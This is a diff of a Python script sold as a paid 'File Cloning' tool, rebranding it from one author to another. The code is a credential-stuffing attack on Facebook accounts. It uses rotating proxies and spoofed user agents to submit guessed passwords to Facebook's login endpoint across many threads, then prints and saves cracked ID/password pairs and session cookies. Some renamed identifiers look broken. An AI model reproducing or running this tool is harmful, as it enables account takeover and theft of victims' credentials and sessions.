@@ -1,5 +1,5 @@
-#RJ_Raju_Razz
-#bypss RJ by RAJU VAII
+#RJRajuRazz
+#bypss RJ by RJRAJURAZZ
 import os 
 #os.system("pkg install sox -y")
 #os.system("play op.mp3")
@@ -37,7 +37,7 @@ try:
 	open('.prox.txt','w').write(prox)
 	
 except Exception as e:
-	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mRJ')
+	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mTutul')
 prox=open('.prox.txt','r').read().splitlines()
 for xd in range(10000):
 	a='Mozilla/5.0 (Symbian/3; Series60/'
@@ -155,7 +155,7 @@ attemps = 0
 #    username = input(' \033[0;92mEnter Username: ')
   #  password = input(' \033[0;93mEnter Password: ')
 
- #   if username == 'RJ Raju Razz' and password == '555666':
+ #   if username == 'Tutul' and password == 'Love':
     #    print(' \033[0;92mYou Have Successfully Logged in.')
     #    break
   #  else:
@@ -167,13 +167,12 @@ os.system('clear')
 
 os.system('espeak -a 300 " Your,   Real,  Name,"')
 NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
-os.system('espeak -a 300 " Welcome,   to,  RJ,  Hacking,  Paid, Tools"')
+os.system('espeak -a 300 " Welcome,   to,  RJ, Hacking, Paid, Tools"')
 os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828')
 def banner():
 	os.system("clear")
 	print (f"""
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\033[0;91m 
+\033[0;92m╔
 ███████╗██╗██████╗ ███████╗
 ██╔════╝██║██╔══██╗██╔════╝
 █████╗  ██║██████╔╝█████╗  
@@ -195,18 +194,18 @@ def banner():
 \033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
 def login():
 	banner()
-	RJRajuRazz('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
-	RJRajuRazz('\033[0;97m===============================================')
-	RJRajuRazz= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
-	if RJRajuRazz in ['m']:
+	TUTULj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
+	TUTULj('\033[0;97m===============================================')
+	TUTUL= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
+	if TUTUL in ['m']:
 		public()
-	elif RJRajuRazz in ['1']:
+	elif TUTUL in ['1']:
 		crack_file()
-	elif RJRajuRazz in ['i','0i']:
+	elif TUTUL in ['i','0i']:
 		result()
-	elif RJRajuRazz in ['2','02']:
+	elif TUTUL in ['2','02']:
 		os.system('xdg-open https://wa.me/+919954282827')
-	elif RJRajuRazz in ['0']:
+	elif TUTUL in ['0']:
 		os.system('rm -rf .token.txt')
 		os.system('rm -rf .cookie.txt')
 		print('#DONE LOGOUT ')
@@ -404,7 +403,7 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\x1b[1;92m LOGIN FIRE\n\x1b[1;97m [1] METHOD Sex ')
+	print('\x1b[1;92m LOGIN FIRE\n\x1b[1;97m [1] METHOD FIRE ')
 	os.system('espeak -a 300 " 1,  method,  FIRE"')
 	hc = input(' CHOOSE: ')
 	if hc in ['1','01']:
@@ -423,7 +422,7 @@ def passwrd():
 	print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTOTAL IDz :\033[0;97m '+str(len(id)))
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;95mCloning Speed Super Fast")
 	print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
-	RJRajuRazz(f'\033[0;97m===============================================')
+	TUTULj(f'\033[0;97m===============================================')
 	with tred(max_workers=30) as pool:
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
@@ -468,8 +467,8 @@ def passwrd():
 					
 				pool.submit(crack,idf,pwv)
 	print('')
-	RJRajuRazz('==========================================')
-	RJRajuRazz('CLONING COMPLETE .......... ')
+	TUTULj('==========================================')
+	TUTULj('CLONING COMPLETE .......... ')
 	print(f'{h}[{h}💚{h}]{h} Your Total OK idz : {h}%s '%(ok))
 	input('CLICK ENTER TO EXIT ')
 		
@@ -493,7 +492,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				#RJRajuRazz
+				#Tutul-King
 				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•RJRajuRazz-Cp] {idf} • {pw}')     
 				os.system('espeak -a 300 " C,  P"')
 			    #open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
@@ -504,8 +503,8 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				#RJRajuRazz
-				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RJRajuRazz-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
+				#Tutul-King
+				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•RJ Raju Razz-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
 				print('\033[0;94m==============================================================')
 				os.system('espeak -a 300 " RJ,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
@@ -524,18 +523,18 @@ if __name__=='__main__':
 	except:pass
 
 def Subscraption():
-	key1=open('/storage/emulated/0/android.txt', 'r').read()
+	key1=open('/storage/emulated/0/android8.txt', 'r').read()
 	r1=requests.get("https://github.com/RJRajuRazz/Fire-Approval/blob/main/Fire-Approval.txt").text
 	if key1 in r1:
 		os.system('clear')
 		login()
 	else:
 		os.system("clear")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m NOT FOR FREE USERS, FREE USERS COME TO MY INBOX")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m FREE USER NOT COME INBOX")
 		time.sleep(0.0010)
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m RJ Raju Razz, Tools Daily Update")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Rupees")
-		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Rupees")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m Tutul King, ToOLs Daily Update")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
+		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
 		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+RJRajuRazz+key1)
 		name = input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Name : ")
 		input("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Press Enter To Send Key")
